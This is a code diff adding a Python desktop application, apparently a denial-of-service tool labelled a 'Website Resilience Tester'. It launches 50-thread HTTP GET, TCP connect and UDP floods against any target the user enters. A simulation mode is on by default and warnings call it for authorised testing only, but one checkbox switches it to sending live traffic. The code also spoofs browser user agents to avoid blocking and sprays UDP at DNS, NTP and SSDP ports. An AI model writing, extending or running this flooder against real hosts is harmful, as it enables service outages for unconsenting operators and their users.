@@ -1,0 +1,474 @@
+import tkinter as tk
+from tkinter import ttk, scrolledtext, messagebox, Checkbutton, IntVar
+import threading
+import time
+import socket
+import random
+import requests
+from queue import Queue
+import sys
+
+# =============================================================================
+# !!! WARNING !!! WARNING !!! WARNING !!! WARNING !!! WARNING !!!
+# =============================================================================
+# This tool is designed for AUTHORIZED TESTING ON INFRASTRUCTURE YOU OWN
+# AND HAVE EXPLICIT PERMISSION TO TEST.
+#
+# Using this tool to generate significant network traffic against targets
+# you do not own or do not have explicit, verified permission to test is
+# ILLEGAL and HARMFUL. You could face severe legal consequences.
+#
+# The default mode is SIMULATION MODE, which logs the INTENT to send traffic
+# but does NOT send actual packets or requests.
+#
+# Enabling "Active Mode" (SIMULATION_MODE = False) or running the raw socket
+# floods (TCP SYN, UDP) often requires ELEVATED PRIVILEGES (root/administrator)
+# and may require additional libraries like scapy, which are NOT included
+# in standard Python. These raw socket floods are highly dependent on the
+# operating system and network configuration.
+#
+# SecureFin Corp. (or the entity providing this code) is NOT responsible for
+# any misuse of this tool. Use responsibly and ethically.
+# =============================================================================
+
+# === CONFIGURATION ===
+# Default to simulation mode (no real packets sent). Change ONLY if you
+# understand the risks and have explicit authorization for the target.
+SIMULATION_MODE_DEFAULT = True
+
+# Number of worker threads to generate traffic concurrently
+MAX_THREADS = 50
+
+# Default rate limit (packets/requests per second)
+DEFAULT_RATE_LIMIT = 100
+
+# Timeout for network operations (seconds)
+NETWORK_TIMEOUT = 5
+
+# --- Raw Socket Note ---
+# The TCP SYN and UDP flood implementations below use basic sockets.
+# A true, high-volume SYN or UDP flood often requires crafting raw packets
+# using libraries like 'scapy' and requires root/administrator privileges.
+# The current implementation may be blocked by firewalls or OS restrictions.
+# For reliable testing, especially of raw packet floods, consider using
+# dedicated network testing tools or libraries like scapy with necessary permissions.
+# =======================
+
+
+class DDOSTesterApp:
+    def __init__(self, root):
+        self.root = root
+        self.root.title("Website Resilience Tester (Ethical Use Only)")
+        self.root.geometry("700x550")
+        self.root.resizable(False, False) # Prevent resizing for simpler layout
+
+        # Thread-safe stop event - Initialized as NOT set
+        self.stop_event = threading.Event()
+        # Queue for thread-safe logging
+        self.log_queue = Queue()
+        # List to keep track of active flood threads (not strictly needed for daemon threads, but good practice)
+        self.flood_threads = []
+        # Counter for packets/requests sent
+        self.packet_count = 0
+        # Lock for updating packet_count
+        self.count_lock = threading.Lock()
+        # Variable to hold the simulation mode state
+        self.simulation_mode_var = IntVar(value=SIMULATION_MODE_DEFAULT)
+
+        self._build_gui()
+        # Start the log processing thread (daemon=True so it exits when main thread exits)
+        self.log_processor_thread = threading.Thread(target=self._process_log_queue, daemon=True)
+        self.log_processor_thread.start()
+
+    def _build_gui(self):
+        # Use a themed style
+        style = ttk.Style()
+        style.theme_use('clam') # Or 'alt', 'default', 'classic'
+
+        # Configure button colors (requires mapping style names)
+        style.configure('Start.TButton', foreground='green', font=('Arial', 10, 'bold'))
+        style.configure('Stop.TButton', foreground='red', font=('Arial', 10, 'bold'))
+        style.map('Start.TButton',
+                  foreground=[('disabled', 'grey'), ('active', 'darkgreen')],
+                  background=[('active', '!disabled', 'lightgreen')])
+        style.map('Stop.TButton',
+                  foreground=[('disabled', 'grey'), ('active', 'darkred')],
+                  background=[('active', '!disabled', 'salmon')])
+
+
+        # --- Input Frame ---
+        input_frame = ttk.LabelFrame(self.root, text="Attack Configuration", padding="10")
+        input_frame.grid(row=0, column=0, padx=10, pady=10, sticky="nsew")
+        self.root.grid_columnconfigure(0, weight=1)
+
+        ttk.Label(input_frame, text="Target Domain/IP:").grid(row=0, column=0, padx=5, pady=5, sticky="w")
+        self.target_entry = ttk.Entry(input_frame, width=40)
+        self.target_entry.grid(row=0, column=1, padx=5, pady=5, sticky="ew")
+        input_frame.grid_columnconfigure(1, weight=1)
+
+        ttk.Label(input_frame, text="Attack Type:").grid(row=1, column=0, padx=5, pady=5, sticky="w")
+        self.attack_type = ttk.Combobox(input_frame, values=["HTTP GET", "TCP SYN", "UDP"], state="readonly", width=38)
+        self.attack_type.grid(row=1, column=1, padx=5, pady=5, sticky="ew")
+        self.attack_type.set("HTTP GET")
+
+        ttk.Label(input_frame, text="Rate Limit (per sec):").grid(row=2, column=0, padx=5, pady=5, sticky="w")
+        self.rate_limit_entry = ttk.Entry(input_frame, width=10)
+        self.rate_limit_entry.grid(row=2, column=1, padx=5, pady=5, sticky="w")
+        self.rate_limit_entry.insert(0, str(DEFAULT_RATE_LIMIT))
+
+        # Simulation Mode Checkbox
+        self.simulation_checkbox = Checkbutton(input_frame,
+                                               text="Simulation Mode (Default: ON)",
+                                               variable=self.simulation_mode_var,
+                                               onvalue=1, offvalue=0)
+        self.simulation_checkbox.grid(row=3, column=0, columnspan=2, padx=5, pady=10, sticky="w")
+        # Display warning if simulation mode is off initially (user changed default in code)
+        if not SIMULATION_MODE_DEFAULT:
+             messagebox.showwarning("Warning", "Simulation mode is OFF by default in the code. Proceed with extreme caution and verified authorization.")
+
+
+        # --- Buttons Frame ---
+        button_frame = ttk.Frame(self.root, padding="10")
+        button_frame.grid(row=1, column=0, padx=10, pady=5, sticky="ew")
+        button_frame.grid_columnconfigure(0, weight=1)
+        button_frame.grid_columnconfigure(1, weight=1)
+
+        self.start_button = ttk.Button(button_frame, text="Start Attack", command=self.start_attack, style='Start.TButton')
+        self.start_button.grid(row=0, column=0, padx=5, pady=5, sticky="ew")
+
+        self.stop_button = ttk.Button(button_frame, text="Stop Attack", command=self.stop_attack, state=tk.DISABLED, style='Stop.TButton')
+        self.stop_button.grid(row=0, column=1, padx=5, pady=5, sticky="ew")
+
+        # --- Log Output Area ---
+        log_frame = ttk.LabelFrame(self.root, text="Log Output", padding="10")
+        log_frame.grid(row=2, column=0, padx=10, pady=10, sticky="nsew")
+        self.root.grid_rowconfigure(2, weight=1)
+
+        self.log_output = scrolledtext.ScrolledText(log_frame, width=80, height=15, wrap=tk.WORD, state=tk.DISABLED, bg="#f0f0f0", fg="#333")
+        self.log_output.pack(expand=True, fill="both")
+
+        # --- Status Bar ---
+        self.status_bar = ttk.Label(self.root, text="Idle", relief=tk.SUNKEN, anchor=tk.W)
+        self.status_bar.grid(row=3, column=0, sticky="ew")
+
+        # Initial status update
+        self._update_status("Idle")
+        if self.simulation_mode_var.get():
+             self._update_status("Idle (Simulation Mode ON)", color="blue")
+        else:
+             self._update_status("Idle (Simulation Mode OFF - CAUTION!)", color="orange")
+
+
+    def _update_status(self, message, color="black"):
+        """Thread-safe status bar update."""
+        # Use root.after to ensure GUI updates happen on the main thread
+        self.root.after(0, self.status_bar.config, {'text': message, 'foreground': color})
+
+
+    def _process_log_queue(self):
+        """Processes messages from the log queue and updates the GUI."""
+        while True:
+            message = self.log_queue.get()
+            if message is None: # Sentinel value to stop the thread
+                break
+            self._insert_log(message)
+            self.log_queue.task_done()
+
+    def log(self, message):
+        """Puts a message into the log queue for thread-safe display."""
+        self.log_queue.put(message)
+
+    def _insert_log(self, message):
+        """Inserts a message into the log area (must be called from main thread)."""
+        # Use root.after to ensure GUI updates happen on the main thread
+        self.root.after(0, self._perform_insert_log, message)
+
+    def _perform_insert_log(self, message):
+        """Actual log insertion, called via root.after."""
+        self.log_output.configure(state=tk.NORMAL)
+        self.log_output.insert(tk.END, message + "\n")
+        self.log_output.see(tk.END)
+        self.log_output.configure(state=tk.DISABLED)
+
+
+    def start_attack(self):
+        """Validates input and starts the attack threads."""
+        # Check if the start button is currently disabled. If so, attack is likely running or starting.
+        if self.start_button['state'] == tk.DISABLED:
+            return
+
+        target = self.target_entry.get().strip()
+        attack_type = self.attack_type.get()
+        simulation_mode = self.simulation_mode_var.get() == 1
+
+        try:
+            rate_limit = int(self.rate_limit_entry.get())
+            if rate_limit <= 0:
+                raise ValueError("Rate limit must be a positive integer.")
+        except ValueError as e:
+            messagebox.showerror("Input Error", f"Invalid rate limit: {e}")
+            return
+
+        if not target:
+            messagebox.showerror("Input Error", "Target domain/IP cannot be empty.")
+            return
+
+        # --- DNS Resolution ---
+        self.log("Attempting to resolve target...")
+        self._update_status("Resolving target...", color="blue")
+
+        # Disable start button immediately, enable stop later if resolution succeeds
+        self.start_button.config(state=tk.DISABLED)
+        self.stop_button.config(state=tk.DISABLED) # Keep disabled until threads are ready
+
+        # Use a separate thread for DNS resolution to keep GUI responsive
+        resolve_thread = threading.Thread(target=self._resolve_and_start,
+                                          args=(target, attack_type, rate_limit, simulation_mode),
+                                          daemon=True)
+        resolve_thread.start()
+
+
+    def _resolve_and_start(self, target, attack_type, rate_limit, simulation_mode):
+         """Performs DNS resolution and starts flood threads."""
+         try:
+             ip = socket.gethostbyname(target)
+             self.log(f"Target resolved to IP: {ip}")
+             self.log(f"Starting {attack_type} flood...")
+             self.log(f"Simulation Mode: {'ON' if simulation_mode else 'OFF'}")
+             self._update_status(f"Starting {attack_type} flood...", color="green")
+
+             # Clear the stop event to allow threads to run
+             self.stop_event.clear()
+             self.packet_count = 0
+             self.flood_threads = []
+
+             # Calculate delay per thread to meet total rate limit
+             # Ensure delay is not zero if rate_limit is very high
+             # Distribute the rate limit across threads
+             rate_limit_per_thread = rate_limit / MAX_THREADS
+             thread_delay = 1.0 / rate_limit_per_thread if rate_limit_per_thread > 0 else 0
+             thread_delay = max(thread_delay, 0.001) # Minimum delay to prevent 0 or negative
+
+             self.log(f"Using {MAX_THREADS} threads with ~{1/thread_delay:.2f} packets/sec per thread.")
+
+
+             for i in range(MAX_THREADS):
+                 t = threading.Thread(target=self._run_flood_worker,
+                                      args=(ip, attack_type, thread_delay, simulation_mode),
+                                      daemon=True) # Daemon threads exit when the main program exits
+                 self.flood_threads.append(t)
+                 t.start()
+
+             # Enable stop button once threads are launched
+             self.root.after(0, self.stop_button.config, {'state': tk.NORMAL})
+             self.root.after(0, self._update_status, f"{attack_type} flood running against {ip}", "green")
+
+
+         except socket.gaierror as e:
+             self.log(f"DNS resolution failed for {target}: {e}")
+             self._update_status("DNS Resolution Failed", color="red")
+             self.root.after(0, self.start_button.config, {'state': tk.NORMAL})
+             self.root.after(0, self.stop_button.config, {'state': tk.DISABLED})
+         except Exception as e:
+             self.log(f"An error occurred during flood setup: {e}")
+             self._update_status("Error during setup", color="red")
+             self.root.after(0, self.start_button.config, {'state': tk.NORMAL})
+             self.root.after(0, self.stop_button.config, {'state': tk.DISABLED})
+
+
+    def stop_attack(self):
+        """Signals threads to stop and updates GUI state."""
+        # Check if the stop button is currently disabled. If so, attack is not running.
+        if self.stop_button['state'] == tk.DISABLED:
+            return
+
+        self.log("Stopping attack...")
+        self._update_status("Stopping...", color="orange")
+        self.stop_event.set() # Signal all threads to stop
+
+        # Update button states after signaling stop
+        self.start_button.config(state=tk.NORMAL)
+        self.stop_button.config(state=tk.DISABLED)
+        self._update_status("Stopped", color="red")
+        self.log("Attack stop signal sent. Threads should terminate shortly.")
+
+        # Note: Daemon threads will exit automatically when the main application thread exits.
+        # If they were not daemon, we would need to join them here or in a separate cleanup.
+
+
+    def _run_flood_worker(self, ip, attack_type, thread_delay, simulation_mode):
+        """Worker thread function to send flood traffic."""
+        while not self.stop_event.is_set():
+            try:
+                if simulation_mode:
+                    # Simulate sending a packet/request
+                    # self.log(f"[SIM] Simulating {attack_type} packet to {ip}") # Log every packet in sim can be noisy
+                    with self.count_lock:
+                        self.packet_count += 1
+                    # Simulate processing time
+                    time.sleep(thread_delay)
+                    # Periodically update log in simulation mode to show progress
+                    if self.packet_count % 100 == 0:
+                         self.log(f"[SIM] Simulated {self.packet_count} {attack_type} packets.")
+
+                else:
+                    # Active mode - send real traffic
+                    if attack_type == "HTTP GET":
+                        self._send_http_get(ip)
+                    elif attack_type == "TCP SYN":
+                        self._send_tcp_syn(ip)
+                    elif attack_type == "UDP":
+                        self._send_udp(ip)
+
+                    # Apply rate limiting delay for this thread
+                    time.sleep(thread_delay)
+
+            except Exception as e:
+                # Log errors but don't stop the thread for transient issues
+                self.log(f"Worker Error ({attack_type}): {e}")
+                # Add a small delay on error to prevent rapid error looping
+                time.sleep(1)
+
+        self.log(f"Worker thread ({attack_type}) stopping.")
+
+
+    def _send_http_get(self, ip):
+        """Sends a single HTTP GET request."""
+        try:
+            # Using requests for simplicity, can use http.client for lower level
+            # Add headers to mimic a browser and avoid immediate blocking
+            headers = {
+                'User-Agent': f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(80, 100)}.0.3987.132 Safari/537.36',
+                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+                'Accept-Language': 'en-US,en;q=0.5',
+                'Connection': 'keep-alive', # Try to keep connection open
+                'Cache-Control': 'no-cache'
+            }
+            # Use https by default, fallback to http if needed (more realistic)
+            try:
+                url = f"https://{ip}/"
+                response = requests.get(url, headers=headers, timeout=NETWORK_TIMEOUT, verify=False) # verify=False for self-signed certs in testing
+            except requests.exceptions.SSLError:
+                 url = f"http://{ip}/"
+                 response = requests.get(url, headers=headers, timeout=NETWORK_TIMEOUT)
+
+            with self.count_lock:
+                self.packet_count += 1
+            self.log(f"[HTTP GET] Sent #{self.packet_count}, Status: {response.status_code}")
+            # Optional: Process response.text or headers if needed for analysis
+
+        except requests.exceptions.Timeout:
+             self.log(f"[HTTP GET] Timeout sending to {ip}")
+        except requests.exceptions.ConnectionError as e:
+             # Log connection errors, but these are expected in a flood scenario
+             # self.log(f"[HTTP GET] Connection Error to {ip}: {e}")
+             pass # Suppress frequent connection errors in log
+        except Exception as e:
+            self.log(f"[HTTP GET] Unexpected error: {e}")
+
+
+    def _send_tcp_syn(self, ip):
+        """Attempts to send a TCP SYN packet (basic socket method)."""
+        # NOTE: This method uses basic sockets and may not generate true SYN floods
+        # or require elevated privileges depending on the OS.
+        # A true SYN flood requires raw sockets/scapy.
+        try:
+            # Create a raw socket (requires root/admin) - This will likely fail without privileges
+            # s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
+            # Instead, use a basic socket connection attempt which sends SYN but expects response
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(NETWORK_TIMEOUT) # Set a timeout for connect
+            # Attempt to connect - this sends a SYN
+            target_port = 80 # Default to HTTP port
+            # Could add logic here to try 443 if 80 fails or based on user input
+            s.connect((ip, target_port)) # Target port 80 (HTTP)
+            # If connect succeeds, it's not a pure SYN flood, but it consumes server resources
+            # We immediately close to simulate a half-open connection attempt
+            s.close()
+            with self.count_lock:
+                self.packet_count += 1
+            self.log(f"[TCP SYN] Sent #{self.packet_count} (Connection attempt to {ip}:{target_port})")
+
+        except ConnectionRefusedError:
+            # Expected if port is closed, still indicates packet reached
+            with self.count_lock:
+                self.packet_count += 1
+            self.log(f"[TCP SYN] Sent #{self.packet_count} (Connection Refused on {ip}:{target_port})")
+        except socket.timeout:
+             # Expected in SYN flood scenarios if server is overwhelmed or firewalled
+             with self.count_lock:
+                self.packet_count += 1
+             self.log(f"[TCP SYN] Sent #{self.packet_count} (Timeout on {ip}:{target_port})")
+        except OSError as e:
+             # Likely permission error if trying raw sockets without privilege
+             self.log(f"[TCP SYN] OS Error (Permission?): {e}. Raw sockets may require root/admin.")
+             # self.stop_attack() # Consider stopping if raw socket creation fails
+        except Exception as e:
+            self.log(f"[TCP SYN] Unexpected error: {e}")
+        finally:
+             # Ensure socket is closed if it was created and is still open
+             if 's' in locals():
+                 try:
+                     s.shutdown(socket.SHUT_RDWR) # Attempt graceful shutdown
+                 except:
+                     pass # Ignore errors if socket is already closed/broken
+                 try:
+                     s.close()
+                 except:
+                     pass # Ignore errors if socket is already closed/broken
+
+
+    def _send_udp(self, ip):
+        """Sends a single UDP packet (basic socket method)."""
+        # NOTE: This method uses basic sockets and may not generate high-volume UDP floods
+        # or require elevated privileges depending on the OS/target port.
+        # A true UDP flood often requires raw sockets/scapy.
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            # Send data to a common UDP port, e.g., 53 (DNS) or a random high port
+            target_port = random.choice([53, 123, 1900, random.randint(1024, 65535)]) # DNS, NTP, SSDP, or random
+            message = b'X' * random.randint(100, 1024) # Random payload size
+            s.sendto(message, (ip, target_port))
+            s.close()
+            with self.count_lock:
+                self.packet_count += 1
+            self.log(f"[UDP] Sent #{self.packet_count} to {ip}:{target_port}")
+
+        except OSError as e:
+             # Likely permission error if trying raw sockets without privilege (less common for UDP sendto)
+             self.log(f"[UDP] OS Error: {e}. Check permissions or target port.")
+        except Exception as e:
+            self.log(f"[UDP] Unexpected error: {e}")
+        finally:
+             # Ensure socket is closed if it was created
+             if 's' in locals() and s.fileno() != -1:
+                 s.close()
+
+
+    def on_closing(self):
+        """Handles window closing event."""
+        # Check if the stop event is NOT set, which implies threads might be running
+        if not self.stop_event.is_set() and threading.active_count() > 2: # >2 accounts for main and log processor threads
+            if messagebox.askokcancel("Quit", "Attack is running. Do you want to stop and quit?"):
+                self.stop_attack() # Signal threads to stop
+                # Give threads a moment to stop, then destroy GUI
+                # Use root.after to schedule destruction on the main thread
+                self.root.after(500, self.root.destroy)
+            # Else: Do nothing, keep the window open
+        else:
+            # If attack wasn't running or threads already stopped, just destroy
+            self.log_queue.put(None) # Signal log processor to stop
+            self.root.destroy()
+
+
+if __name__ == "__main__":
+    # Add a warning message box when the application starts
+    messagebox.showwarning("Ethical Use Warning",
+                           "This tool is for AUTHORIZED TESTING ONLY on infrastructure you own and have explicit permission to test.\n\n"
+                           "Misuse can lead to severe legal consequences.\n\n"
+                           "Simulation Mode is ON by default.")
+
+    root = tk.Tk()
+    app = DDOSTesterApp(root)
+    root.protocol("WM_DELETE_WINDOW", app.on_closing) # Handle window close button
+    root.mainloop()
